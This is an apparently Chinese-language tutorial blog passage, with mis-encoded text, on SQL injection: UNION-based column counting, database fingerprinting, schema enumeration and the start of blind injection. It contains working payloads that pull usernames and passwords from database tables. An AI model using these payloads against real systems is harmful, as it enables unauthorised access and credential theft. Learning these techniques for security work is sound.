<h4 id="ç¡®å®šæ‰€éœ€çš„åˆ—æ•°"><a href="#ç¡®å®šæ‰€éœ€çš„åˆ—æ•°" class="headerlink" title="ç¡®å®šæ‰€éœ€çš„åˆ—æ•°"></a>ç¡®å®šæ‰€éœ€çš„åˆ—æ•°</h4><p>æ‰§è¡Œ SQL æ³¨å…¥ UNION æ”»å‡»æ—¶ï¼Œæœ‰ä¸¤ç§æœ‰æ•ˆçš„æ–¹æ³•å¯ä»¥ç¡®å®šä»åŸå§‹æŸ¥è¯¢è¿”å›äº†å¤šå°‘åˆ—ã€‚<br>ä¸€ç§æ–¹æ³•æ˜¯æ³¨å…¥ä¸€ç³»åˆ—ORDER BYå­å¥å¹¶å¢åŠ æŒ‡å®šçš„åˆ—ç´¢å¼•ï¼Œç›´åˆ°å‘ç”Ÿé”™è¯¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ³¨å…¥ç‚¹æ˜¯åŸå§‹æŸ¥è¯¢çš„WHEREå­å¥ä¸­çš„å¸¦å¼•å·çš„å­—ç¬¦ä¸²ï¼Œåˆ™åº”æäº¤ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">1</span>--</span><br><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">2</span>--</span><br><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">3</span>--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure></div>
<p>ORDER BYå­å¥ä¸­çš„åˆ—å¯ä»¥é€šè¿‡å…¶ç´¢å¼•æŒ‡å®šï¼Œå› æ­¤ ä¸éœ€è¦çŸ¥é“ä»»ä½•åˆ—çš„åç§°ã€‚å½“æŒ‡å®šçš„åˆ—ç´¢å¼•è¶…å‡ºç»“æœé›†ä¸­çš„å®é™…åˆ—æ•°æ—¶ï¼Œæ•°æ®åº“å°†è¿”å›é”™è¯¯ï¼Œä¾‹å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">The ORDER BY <span class="keyword">position</span> <span class="keyword">number</span> <span class="number">3</span> is <span class="keyword">out</span> of <span class="built_in">range</span> of the <span class="keyword">number</span> of items <span class="keyword">in</span> the <span class="keyword">select</span> list.</span><br></pre></td></tr></table></figure></div>
<p>åº”ç”¨ç¨‹åºå®é™…ä¸Šå¯èƒ½ä¼šåœ¨å…¶ HTTP å“åº”ä¸­è¿”å›æ•°æ®åº“é”™è¯¯ï¼Œä½†ä¹Ÿå¯èƒ½å‘å‡ºä¸€èˆ¬é”™è¯¯å“åº”ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½æ ¹æœ¬ä¸è¿”å›ä»»ä½•ç»“æœã€‚æ— è®ºå“ªç§æƒ…å†µï¼Œåªè¦ å¯ä»¥æ£€æµ‹åˆ°å“åº”ä¸­çš„ä¸€äº›å·®å¼‚ï¼Œå°±å¯ä»¥æ¨æ–­å‡ºæŸ¥è¯¢è¿”å›äº†å¤šå°‘åˆ—ã€‚<br>ç¬¬äºŒç§æ–¹æ³•æ¶‰åŠæäº¤ä¸€ç³»åˆ—æŒ‡å®šä¸åŒæ•°é‡çš„ç©ºå€¼çš„UNION SELECTï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>--</span><br><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>,<span class="built_in">NULL</span>--</span><br><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>,<span class="built_in">NULL</span>,<span class="built_in">NULL</span>--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœç©ºå€¼çš„æ•°é‡ä¸åˆ—æ•°ä¸åŒ¹é…ï¼Œæ•°æ®åº“å°†è¿”å›é”™è¯¯ï¼Œä¾‹å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">All</span> queries combined <span class="keyword">using</span> a <span class="keyword">UNION</span>, <span class="keyword">INTERSECT</span> <span class="keyword">or</span> <span class="keyword">EXCEPT</span> <span class="keyword">operator</span> must have an equal number <span class="keyword">of</span> expressions <span class="keyword">in</span> their target lists.</span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬ä½¿ç”¨NULLä½œä¸ºæ³¨å…¥çš„SELECTæŸ¥è¯¢çš„è¿”å›å€¼ï¼Œå› ä¸ºæ¯åˆ—ä¸­çš„æ•°æ®ç±»å‹å¿…é¡»åœ¨åŸå§‹æŸ¥è¯¢å’Œæ³¨å…¥æŸ¥è¯¢ä¹‹é—´å…¼å®¹.NULLå¯è½¬æ¢ä¸ºæ¯ç§å¸¸è§æ•°æ®ç±»å‹ï¼Œå› æ­¤å½“åˆ—æ•°æ­£ç¡®æ—¶ï¼Œå®ƒå¯ä»¥æœ€å¤§é™åº¦åœ°æé«˜payloadæˆåŠŸçš„æœºä¼šã€‚<br><img src="https://pic1.imgdb.cn/item/67c84d88d0e0a243d40cdb3b.png"><br>è¿™é‡Œå°±æ˜¯æœ‰ä¸‰åˆ—ï¼Œæ‰€ä»¥è¾“å…¥ä¸‰ä¸ªNULLï¼Œå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œè¾“å…¥å…¶ä»–æ•°é‡çš„NULLå°±æ— æ³•è®¿é—®åˆ°å•†å“æ•°æ®</p>
<h4 id="æ•°æ®åº“ç‰¹å®šçš„è¯­æ³•"><a href="#æ•°æ®åº“ç‰¹å®šçš„è¯­æ³•" class="headerlink" title="æ•°æ®åº“ç‰¹å®šçš„è¯­æ³•"></a>æ•°æ®åº“ç‰¹å®šçš„è¯­æ³•</h4><p>åœ¨ Oracle ä¸Šï¼Œæ¯ä¸ªSELECTæŸ¥è¯¢éƒ½å¿…é¡»ä½¿ç”¨FROMå…³é”®å­—å¹¶æŒ‡å®šä¸€ä¸ªæœ‰æ•ˆçš„è¡¨ã€‚Oracle ä¸Šæœ‰ä¸€ä¸ªåä¸ºdualå†…ç½®è¡¨å¯ç”¨äºæ­¤ç›®çš„ã€‚å› æ­¤ï¼ŒOracle ä¸Šçš„æ³¨å…¥æŸ¥è¯¢éœ€è¦å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span> FROM DUAL--</span><br></pre></td></tr></table></figure></div>
<p>åœ¨ MySQL ä¸Šï¼ŒåŒç ´æŠ˜å·åºåˆ—åé¢å¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚æˆ–è€…ï¼Œå¯ä»¥ä½¿ç”¨äº•å·#æ¥æ ‡è¯†æ³¨é‡Šã€‚<br>sqlæ³¨å…¥é€ŸæŸ¥è¡¨ï¼š<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
<h4 id="æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—"><a href="#æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—" class="headerlink" title="æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—"></a>æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—</h4><p>SQL æ³¨å…¥ UNION æ”»å‡»å¯è®© æ£€ç´¢æ³¨å…¥æŸ¥è¯¢çš„ç»“æœã€‚ æƒ³è¦æ£€ç´¢çš„æœ‰è¶£æ•°æ®é€šå¸¸ä¸ºå­—ç¬¦ä¸²å½¢å¼ã€‚è¿™æ„å‘³ç€ éœ€è¦åœ¨åŸå§‹æŸ¥è¯¢ç»“æœä¸­æ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®ç±»å‹ä¸ºå­—ç¬¦ä¸²æ•°æ®æˆ–ä¸å­—ç¬¦ä¸²æ•°æ®å…¼å®¹çš„åˆ—ã€‚<br>ç¡®å®šæ‰€éœ€åˆ—æ•°åï¼Œ å¯ä»¥æ¢æµ‹æ¯åˆ—ä»¥æµ‹è¯•å…¶æ˜¯å¦å¯ä»¥å®¹çº³å­—ç¬¦ä¸²æ•°æ®ã€‚ å¯ä»¥æäº¤ä¸€ç³»åˆ—UNION SELECTï¼Œä¾æ¬¡å°†å­—ç¬¦ä¸²å€¼æ”¾å…¥æ¯åˆ—ä¸­ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæŸ¥è¯¢è¿”å›å››åˆ—ï¼Œåˆ™ å¯ä»¥æäº¤ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VHDL"><figure class="iseeu highlight /vhdl"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœåˆ—æ•°æ®ç±»å‹ä¸å­—ç¬¦ä¸²æ•°æ®ä¸å…¼å®¹ï¼Œåˆ™æ³¨å…¥çš„æŸ¥è¯¢å°†å¯¼è‡´æ•°æ®åº“é”™è¯¯ï¼Œå¦‚æœæ²¡æœ‰å‘ç”Ÿé”™è¯¯ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºçš„å“åº”åŒ…å«ä¸€äº›é¢å¤–çš„å†…å®¹ï¼ˆåŒ…æ‹¬æ³¨å…¥çš„å­—ç¬¦ä¸²å€¼ï¼‰ï¼Œé‚£ä¹ˆç›¸å…³åˆ—é€‚åˆæ£€ç´¢å­—ç¬¦ä¸²æ•°æ®ã€‚</p>
<h4 id="ä½¿ç”¨-SQL-æ³¨å…¥-UNION-æ”»å‡»æ¥æ£€ç´¢æœ‰è¶£çš„æ•°æ®"><a href="#ä½¿ç”¨-SQL-æ³¨å…¥-UNION-æ”»å‡»æ¥æ£€ç´¢æœ‰è¶£çš„æ•°æ®" class="headerlink" title="ä½¿ç”¨ SQL æ³¨å…¥ UNION æ”»å‡»æ¥æ£€ç´¢æœ‰è¶£çš„æ•°æ®"></a>ä½¿ç”¨ SQL æ³¨å…¥ UNION æ”»å‡»æ¥æ£€ç´¢æœ‰è¶£çš„æ•°æ®</h4><p>å½“ ç¡®å®šäº†åŸå§‹æŸ¥è¯¢è¿”å›çš„åˆ—æ•°å¹¶å‘ç°å“ªäº›åˆ—å¯ä»¥ä¿å­˜å­—ç¬¦ä¸²æ•°æ®æ—¶ï¼Œ å°±å¯ä»¥æ£€ç´¢æœ‰è¶£çš„æ•°æ®ã€‚<br>ç°åœ¨å‡è®¾ï¼š1.åŸå§‹æŸ¥è¯¢è¿”å›ä¸¤åˆ—ï¼Œå¹¶ä¸”ä¸¤åˆ—éƒ½å¯ä»¥ä¿å­˜å­—ç¬¦ä¸²å—ã€‚2.æ³¨å…¥ç‚¹æ˜¯WHEREå­å¥å†…çš„å¸¦å¼•å·çš„å­—ç¬¦ä¸²ã€‚3.æ•°æ®åº“åŒ…å«ä¸€ä¸ªåä¸ºusersè¡¨ï¼Œå…¶ä¸­åŒ…å«usernameå’Œpassword ã€‚</p>
<p>æ‰€ä»¥sqlæ³¨å…¥çš„è¯­å¥å¯ä»¥æ˜¯</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œ éœ€è¦çŸ¥é“æœ‰ä¸€ä¸ªåä¸ºusersçš„è¡¨ï¼Œå…¶ä¸­åŒ…å«ä¸¤åˆ—ï¼Œåˆ†åˆ«ç§°ä¸ºusernameå’Œpassword ã€‚å¦‚æœæ²¡æœ‰è¿™äº›ä¿¡æ¯ï¼Œ å°†ä¸å¾—ä¸çŒœæµ‹è¡¨å’Œåˆ—çš„åç§°ã€‚æ‰€æœ‰ç°ä»£æ•°æ®åº“éƒ½æä¾›äº†æ£€æŸ¥æ•°æ®åº“ç»“æ„å¹¶ç¡®å®šå®ƒä»¬åŒ…å«å“ªäº›è¡¨å’Œåˆ—çš„æ–¹æ³•ã€‚</p>
<h4 id="æ£€ç´¢å•ä¸ªåˆ—ä¸­çš„å¤šä¸ªå€¼"><a href="#æ£€ç´¢å•ä¸ªåˆ—ä¸­çš„å¤šä¸ªå€¼" class="headerlink" title="æ£€ç´¢å•ä¸ªåˆ—ä¸­çš„å¤šä¸ªå€¼"></a>æ£€ç´¢å•ä¸ªåˆ—ä¸­çš„å¤šä¸ªå€¼</h4><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸Šä¾‹ä¸­çš„æŸ¥è¯¢å¯èƒ½ä»…è¿”å›å•ä¸ªåˆ—ã€‚å¯ä»¥é€šè¿‡å°†å€¼è¿æ¥åœ¨ä¸€èµ·æ¥æ£€ç´¢æ­¤å•ä¸ªåˆ—ä¸­çš„å¤šä¸ªå€¼ã€‚ å¯ä»¥æ·»åŠ åˆ†éš”ç¬¦æ¥åŒºåˆ†ç»„åˆçš„å€¼ã€‚ä¾‹å¦‚ï¼Œåœ¨ Oracle ä¸Šï¼Œ å¯ä»¥æäº¤è¾“å…¥ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username || <span class="string">&#x27;~&#x27;</span> || <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
<p>è¿™ä½¿ç”¨äº†åŒç®¡é“åºåˆ—||è¿™æ˜¯ Oracle ä¸Šçš„å­—ç¬¦ä¸²è¿æ¥è¿ç®—ç¬¦ã€‚æ³¨å…¥çš„æŸ¥è¯¢å°†usernameå’Œpasswordå­—æ®µçš„å€¼è¿æ¥åœ¨ä¸€èµ·ï¼Œä»¥~å­—ç¬¦åˆ†éš”ã€‚<br>å…¶ä»–å‡ ä¸ªæ•°æ®åº“çš„æ‹¼æ¥è¯­å¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span>  <span class="string">&#x27;foo&#x27;</span>+<span class="string">&#x27;bar&#x27;</span></span><br><span class="line">PostgreSQL  <span class="string">&#x27;foo&#x27;</span>||<span class="string">&#x27;bar&#x27;</span> </span><br><span class="line">            <span class="string">&#x27;foo&#x27;</span> <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">MySQL       <span class="string">&#x27;foo&#x27;</span> <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">            CONCAT(<span class="string">&#x27;foo&#x27;</span>,<span class="string">&#x27;bar&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>mysqlé™¤äº†concatè¿˜æœ‰group_concatä¹Ÿæ˜¯å¾ˆå¸¸ç”¨çš„æ‹¼æ¥å‡½æ•°<br><img src="https://pic1.imgdb.cn/item/67c8631ad0e0a243d40ce355.png"><br>æ¯”å¦‚åœ¨è¿™é‡Œå…ˆç”¨UNIONæŸ¥è¯¢NULLçŸ¥é“æœ‰ä¸¤åˆ—æ•°æ®ï¼Œç„¶åæŸ¥è¯¢å­—ç¬¦ä¸²ï¼ŒçŸ¥é“åªæœ‰ç¬¬äºŒåˆ—å¯ä»¥è¿”å›æŸ¥è¯¢ï¼Œç„¶åå°±ç”¨oracleä¸Šé¢çš„æ‹¼æ¥æŸ¥è¯¢ä¸¤ä¸ªå­—æ®µ</p>
<h2 id="å¸¸è§æ•°æ®åº“ä¸­æ£€æŸ¥æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ”»å‡»"><a href="#å¸¸è§æ•°æ®åº“ä¸­æ£€æŸ¥æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ”»å‡»" class="headerlink" title="å¸¸è§æ•°æ®åº“ä¸­æ£€æŸ¥æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ”»å‡»"></a>å¸¸è§æ•°æ®åº“ä¸­æ£€æŸ¥æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ”»å‡»</h2><p>ä¸Šé¢è¯´å®Œäº†sqlæ³¨å…¥ç¤ºä¾‹ï¼Œé‚£ç°åœ¨å½“ç„¶è¦çŸ¥é“ä»€ä¹ˆæ—¶å€™å¯ä»¥è¿›è¡Œsqlæ³¨å…¥æ”»å‡»ï¼Œå¯¹äºä¸åŒçš„æ•°æ®åº“ï¼Œæ–¹å¼ä¹Ÿä¸åŒ<br>è¦åˆ©ç”¨ SQL æ³¨å…¥æ¼æ´ï¼Œé€šå¸¸éœ€è¦æŸ¥æ‰¾æœ‰å…³æ•°æ®åº“çš„ä¿¡æ¯ã€‚ å…¶ä¸­åŒ…æ‹¬</p>
<ul>
<li>æ•°æ®åº“è½¯ä»¶çš„ç±»å‹å’Œç‰ˆæœ¬ã€‚</li>
<li>æ•°æ®åº“åŒ…å«çš„è¡¨å’Œåˆ—ã€‚</li>
</ul>
<h3 id="æŸ¥è¯¢æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬"><a href="#æŸ¥è¯¢æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬"></a>æŸ¥è¯¢æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬</h3><p>ä»¥ä¸‹æ˜¯ä¸€äº›ç”¨äºç¡®å®šæŸäº›æµè¡Œæ•°æ®åº“ç±»å‹çš„æ•°æ®åº“ç‰ˆæœ¬çš„æŸ¥è¯¢ï¼š<br>Microsoft, MySQL  SELECT @@version<br>Oracle   SELECT * FROM v$version<br>        SELECT banner FROM v$version<br>          SELECT version FROM v$instance<br>PostgreSQL  SELECT version()<br>å¯ä»¥ä½¿ç”¨UNIONæ”»å‡» ï¼ˆä½¿ç”¨ä¹‹å‰è¦å…ˆæŸ¥åœ¨å“ªä¸€åˆ—å›æ˜¾ä¿¡æ¯ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="comment">@@</span>version--</span><br></pre></td></tr></table></figure></div>
<p>åœ¨ Oracle æ•°æ®åº“ä¸Šï¼Œæ¯ä¸ªSELECTè¯­å¥éƒ½å¿…é¡»æŒ‡å®šè¦ä»FROMé€‰æ‹©çš„è¡¨ã€‚ å¦‚æœ çš„UNION SELECTæ”»å‡»ä¸ä»è¡¨ä¸­æŸ¥è¯¢ï¼Œ ä»ç„¶éœ€è¦åŒ…å«FROMå…³é”®å­—ï¼Œåè·Ÿæœ‰æ•ˆçš„è¡¨åã€‚<br>Oracle ä¸­æœ‰ä¸€ä¸ªåä¸ºdualå†…ç½®è¡¨</p>
<h3 id="åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹"><a href="#åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹" class="headerlink" title="åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹"></a>åˆ—å‡ºæ•°æ®åº“çš„å†…å®¹</h3><p>å¤§å¤šæ•°æ•°æ®åº“ç±»å‹ï¼ˆOracle é™¤å¤–ï¼‰éƒ½æœ‰ä¸€ç»„ç§°ä¸ºä¿¡æ¯æ¨¡å¼çš„è§†å›¾ã€‚å®ƒæä¾›æœ‰å…³æ•°æ®åº“çš„ä¿¡æ¯ã€‚<br>ä¾‹å¦‚ï¼Œ å¯ä»¥æŸ¥è¯¢information_schema.tablesæ¥åˆ—å‡ºæ•°æ®åº“ä¸­çš„è¡¨ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">SELECT * FROM information_schema.tables</span><br><span class="line"></span><br><span class="line">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">MyDatabase     dbo           Products    BASE TABLE</span><br><span class="line">MyDatabase     dbo           Users       BASE TABLE</span><br><span class="line">MyDatabase     dbo           Feedback    BASE TABLE</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åï¼Œ å¯ä»¥æŸ¥è¯¢information_schema.columnsæ¥åˆ—å‡ºå„ä¸ªè¡¨ä¸­çš„åˆ—ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> information_schema.<span class="keyword">columns</span> <span class="keyword">WHERE</span> <span class="built_in">table_name</span> = <span class="string">&#x27;Users&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸€åŠçš„æ­¥éª¤åŒ…æ‹¬ï¼Œç¡®å®šå­—æ®µæ•°ï¼Œåˆ¤æ–­æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—ï¼ŒæŸ¥è¡¨åï¼ŒæŸ¥åˆ—åï¼ŒæŸ¥è¯¢æƒ³è¦çš„ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abc<span class="string">&#x27;,&#x27;</span>def<span class="string">&#x27;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="built_in">table_name</span>,+<span class="keyword">NULL</span>+<span class="keyword">FROM</span>+information_schema.<span class="keyword">tables</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#x27;</span>users_abcdef<span class="string">&#x27;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+username_abcdef,+password_abcdef+<span class="keyword">FROM</span>+users_abcdef<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>

<p>åœ¨ Oracle ä¸Šï¼Œ å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ç›¸åŒçš„ä¿¡æ¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> <span class="built_in">table_name</span> = <span class="string">&#x27;USERS&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>å…¶ä»–ç±»å‹çš„æ•°æ®åº“çš„å†…å®¹åœ¨sqlé€ŸæŸ¥è¡¨é‡Œé¢çœ‹<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
<h2 id="sqlç›²æ³¨"><a href="#sqlç›²æ³¨" class="headerlink" title="sqlç›²æ³¨"></a>sqlç›²æ³¨</h2><p>ä»€ä¹ˆæ˜¯sqlç›²æ³¨ï¼Ÿ å½“åº”ç”¨ç¨‹åºçš„æ•°æ®åº“æŸ¥è¯¢çš„è¿”å›ä¿¡æ¯ä¸å›æ˜¾åœ¨httpå“åº”çš„æ—¶å€™ï¼Œä½†æ˜¯åˆå®¹æ˜“å—åˆ°sqlæ³¨å…¥æ”»å‡»ï¼Œå°±å«åšsqlç›²æ³¨ã€‚å¾ˆå¤šæŠ€æœ¯å¯¹sqlç›²æ³¨æ²¡æœ‰æ•ˆæœï¼Œæ¯”å¦‚uinonæ”»å‡»ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥è¿›è¡Œsqlæ³¨å…¥ï¼Œé€šè¿‡åˆ«çš„æ–¹å¼</p>
<h3 id="é€šè¿‡è§¦å‘æ¡ä»¶å“åº”è¿›è¡Œç›²sqlæ³¨å…¥"><a href="#é€šè¿‡è§¦å‘æ¡ä»¶å“åº”è¿›è¡Œç›²sqlæ³¨å…¥" class="headerlink" title="é€šè¿‡è§¦å‘æ¡ä»¶å“åº”è¿›è¡Œç›²sqlæ³¨å…¥"></a>é€šè¿‡è§¦å‘æ¡ä»¶å“åº”è¿›è¡Œç›²sqlæ³¨å…¥</h3><p>å‡è®¾æœ‰ä¸€ä¸ªåº”ç”¨ç¨‹åºä½¿ç”¨è·Ÿè¸ª Cookie æ¥æ”¶é›†ä½¿ç”¨æƒ…å†µåˆ†ææ•°æ®ã€‚å¯¹è¯¥åº”ç”¨ç¨‹åºçš„è¯·æ±‚åŒ…å«å¦‚ä¸‹ Cookie æ ‡å¤´ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">Cookie: <span class="attribute">TrackingId</span>=u5YD3PapBcR4lN3e7Tj4</span><br></pre></td></tr></table></figure></div>

<p>å½“å¤„ç†åŒ…å«TrackingId cookie çš„è¯·æ±‚æ—¶ï¼Œåº”ç”¨ç¨‹åºä½¿ç”¨ SQL æŸ¥è¯¢æ¥ç¡®å®šè¿™æ˜¯å¦æ˜¯å·²çŸ¥ç”¨æˆ·ï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId = <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br></pre></td></tr></table></figure>

